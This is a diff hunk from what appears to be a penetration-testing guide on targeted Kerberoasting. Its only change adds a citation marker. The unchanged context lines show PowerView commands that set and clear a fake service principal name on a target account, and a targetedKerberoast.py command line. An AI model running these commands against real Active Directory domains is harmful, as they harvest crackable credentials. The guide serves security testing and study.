@@ -193,7 +193,7 @@ Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSv
 Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
 ```
 
-Linux one-liner (targetedKerberoast.py automates add SPN -> request TGS (etype 23) -> remove SPN):
+Linux one-liner (targetedKerberoast.py automates add SPN -> request TGS (etype 23) -> remove SPN):<sup>[[2]](#references)</sup>
 
 ```bash
 targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
